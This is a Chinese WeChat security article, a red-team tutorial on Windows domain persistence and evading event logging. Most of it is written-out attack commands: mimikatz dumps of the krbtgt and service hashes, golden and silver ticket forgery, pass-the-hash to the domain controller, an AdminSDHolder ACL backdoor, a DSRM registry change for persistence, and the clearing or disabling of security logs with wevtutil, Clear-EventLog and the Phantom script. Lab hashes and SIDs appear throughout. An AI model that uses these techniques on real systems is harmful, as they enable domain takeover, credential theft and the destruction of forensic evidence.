##  内网渗透｜域内持久化与Windows日志删除

原创 11ccaab  [ HACK学习呀 ](javascript:void\(0\);)

**HACK学习呀** ![]()

微信号 Hacker1961X

功能介绍
HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！

____

__

收录于话题

#windows 2

#内网渗透 19

#权限维持 4

# 0x01 金票

可以使用krbtgt的NTLM hash创建作为任何用户的有效TGT。要伪造黄金票据的前提是知道域的SID和krbtgt账户的hash或者AES-256值。

## 1.1 收集krbtgt密码信息

    
    
    privilege::debuglsadump::lsa /inject /name:krbtgt

![](https://gitee.com/fuli009/images/raw/master/public/20210814114522.png)

得到krbtgt的hash：

    
    
    c73caed3bc6f0a248e51d37b9a8675fa

域sid值：

    
    
    S-1-5-21-151877218-3666268517-4145415712

## 1.2 金票利用

使用mimikatz伪造kerberos票证

 **生成gold.kribi**

    
    
     mimikatz "kerberos::golden /domain:redteam.local /sid:S-1-5-21-151877218-3666268517-4145415712/krbtgt:c73caed3bc6f0a248e51d37b9a8675fa /user:administrator/ticket:gold.kirbi"

![](https://gitee.com/fuli009/images/raw/master/public/20210814114531.png)

可以看到没有任何票证。

 **导入gold.kribi**

    
    
     kerberos::ptt C:\Users\jack\Desktop\gold.kirbi

![](https://gitee.com/fuli009/images/raw/master/public/20210814114532.png)

成功导入administrator票据。

![]()

可以通过事件管理器查看到是以administrator来登录的

![](https://gitee.com/fuli009/images/raw/master/public/20210814114533.png)

# 0x02 银票

如果我们拥有服务的hash，就可以给自己签发任意用户的TGS票据。金票是伪造TGT可用于访问任何Kerberos服务，而银票是伪造TGS，仅限于访问针对特定服务器的任何服务。

这里使用CIFS服务，该服务是windows机器之间的文件共享。

## 2.1 获取sid

    
    
    whoami /user

![]()

## 2.2 导出服务账号的NTLM Hash

    
    
    privilege::Debugsekurlsa::logonpasswords

![](https://gitee.com/fuli009/images/raw/master/public/20210814114534.png)

## 2.3 创建银票

![]()

    
    
    kerberos::golden /domain:redteam.local/sid:S-1-5-21-151877218-3666268517-4145415712/target:DC.redteam.local/service:cifs /rc4:0703759771e4bed877ecd472c95693a5/user:administrator /ptt

![](https://gitee.com/fuli009/images/raw/master/public/20210814114535.png)

psexec获取DC机器cmd

![]()

# 0x03 AdminSDHolder组

AdminSDHolder是一个特殊的AD容器，具有一些默认安全权限，用作受保护AD账户和组的模板，当我们获取到域控权限，就可以通过授予该用户对容器进行滥用，使该用户成为域管。

默认情况下，该组的 ACL 被复制到所有“受保护组”中。这样做是为了避免有意或无意地更改这些关键组。但是，如果攻击者修改了AdminSDHolder组的
ACL，例如授予普通用户完全权限，则该用户将拥有受保护组内所有组的完全权限（在一小时内）。如果有人试图在一小时或更短的时间内从域管理员中删除此用户（例如），该用户将回到组中。

    
    
    在server2000中引入，默认包含如下的组：AdministratorsDomainAdminsAccountOperatorsBackupOperatorsDomainControllersEnterpriseAdminsPrintOperatorsReplicatorRead-only DomainControllersSchemaAdminsServerOperators

其中Administrators、Domain Admins、Enterprise
Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和组的具备admincount属性值为1的特征。

![](https://gitee.com/fuli009/images/raw/master/public/20210814114536.png)

## 3.1 使用powerview查询

查询ad保护的域的用户

    
    
    Get-NetUser-AdminCount|select samaccountname

![](https://gitee.com/fuli009/images/raw/master/public/20210814114537.png)

查询域中受ad保护的所有组

    
    
    Get-netgroup -AdminCount| select name

![](https://gitee.com/fuli009/images/raw/master/public/20210814114538.png)

## 3.2 使用ActiveDirectory

查询ad保护的域中所有的用户和组

    
    
    Import-ModuleActiveDirectoryGet-ADObject-LDAPFilter"(&(admincount=1)(|(objectcategory=person)(objectcategory=group)))"|select name

![]()

## 3.3 添加用户

添加jack用户对其有完全控制权限。

    
    
    Add-DomainObjectAcl-TargetIdentityAdminSDHolder-PrincipalIdentity jack -RightsAll

然后验证下，这里的sid为jack用户的。

    
    
    Get-DomainObjectAcl adminsdholder | ?{$_.SecurityIdentifier-match "S-1-5-21-151877218-3666268517-4145415712-1106"} | select objectdn,ActiveDirectoryRights |sort -Unique

![](https://gitee.com/fuli009/images/raw/master/public/20210814114539.png)![]()

默认会等待60分钟，可以通过修改注册表来设置为60秒后触发。

    
    
    reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v AdminSDProtectFrequency/t REG_DWORD /d 1/f

![](https://gitee.com/fuli009/images/raw/master/public/20210814114540.png)

## 3.4 恢复

恢复触发时间

    
    
    reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v AdminSDProtectFrequency/t REG_DWORD /d 120/f

取消jack用户对adminSDHolder的权限

    
    
    Remove-DomainObjectAcl-TargetSearchBase"LDAP://CN=AdminSDHolder,CN=System,DC=redteam,DC=local"-PrincipalIdentity jack -RightsAll-Verbose

![]()

# 0x04 DSRM凭证

每个DC内部都有一个本地管理员账户，在该机器上拥有管理员权限。

## 4.1 获取本地管理员hash

    
    
    token::elevatelsadump::sam

![]()

得到hash为：

    
    
    852a844adfce18f66009b4f14e0a98de

## 4.2 检查是否工作

如果注册表项的值为0或者不存在，需要将其设置为2。

检查key是否存在并且获取值：

    
    
    Get-ItemProperty"HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA"-name DsrmAdminLogonBehavior

如果不存在则创建值为2的键：

    
    
    New-ItemProperty"HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA"-name DsrmAdminLogonBehavior-value 2-PropertyType DWORD

如果存在但是不为2设置为2：

    
    
    Set-ItemProperty"HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA"-name DsrmAdminLogonBehavior-value 2

![](https://gitee.com/fuli009/images/raw/master/public/20210814114542.png)

## 4.3 PTH域控

    
    
    sekurlsa::pth /domain:DC /user:Administrator/ntlm:852a844adfce18f66009b4f14e0a98de/run:powershell.exe

![]()

# 0x05 规避Windows 事件日志记录

在做完一些渗透测试清理痕迹是很有必要的一个环节，包括在一些渗透还未结束也要清理掉一些操作日志。在情报收集反溯源等等大多都是采用windows事件日志中。

## 5.1 查看windows日志

### 5.1.1 事件管理器

![](https://gitee.com/fuli009/images/raw/master/public/20210814114543.png)

### 5.1.2 powershell

  

管理员权限运行查看安全类别的日志：

    
    
    Get-WinEvent-FilterHashtable@{logname="security";}

![](https://gitee.com/fuli009/images/raw/master/public/20210814114544.png)

## 5.2 windows日志清除方法

### 5.2.1 wevtutil.exe

 **统计日志列表数目信息等：**

    
    
     wevtutil.exe gli Applicationwevtutil.exe gli Security

![](https://gitee.com/fuli009/images/raw/master/public/20210814114545.png)![](https://gitee.com/fuli009/images/raw/master/public/20210814114546.png)

 **查询指定类别的(这里以security举例):**

    
    
     wevtutil qe Security/f:text

![]()

 **删除指定类别：**

    
    
     wevtutil cl security

  

原本大量日志信息

![](https://gitee.com/fuli009/images/raw/master/public/20210814114547.png)![](https://gitee.com/fuli009/images/raw/master/public/20210814114548.png)![](https://gitee.com/fuli009/images/raw/master/public/20210814114549.png)

但是会留下一个事件id为1102的日志清除日志

### 5.2.2 powershell清除日志

 **查看指定事件id：**

    
    
     Get-EventLogSecurity-InstanceId4624,4625

![]()

 **删除指定类别日志：**

    
    
     Clear-EventLog-LogNameSecurity

![](https://gitee.com/fuli009/images/raw/master/public/20210814114550.png)

### 5.2.3 Phantom脚本

该脚本可以让日志功能失效，无法记录。他会遍历日志进程的线程堆栈来终止日志服务线程。

添加一个用户可以看到产生了日志

![](https://gitee.com/fuli009/images/raw/master/public/20210814114551.png)

我们再给删除

![](https://gitee.com/fuli009/images/raw/master/public/20210814114552.png)

运行ps1脚本：

![]()

再次添加用户查看日志：

![](https://gitee.com/fuli009/images/raw/master/public/20210814114553.png)

**![](https://gitee.com/fuli009/images/raw/master/public/20210814114554.png)**

  

 **推荐阅读：**

  

 **祝各位小伙伴们七夕快乐！**

  

 **早生贵子，一发三胞胎  
**

  

 **嘿嘿**

  

 **点赞，转发，在看**

  

原创投稿作者：11ccaab

![](https://gitee.com/fuli009/images/raw/master/public/20210814114555.png)

  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

内网渗透｜域内持久化与Windows日志删除

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

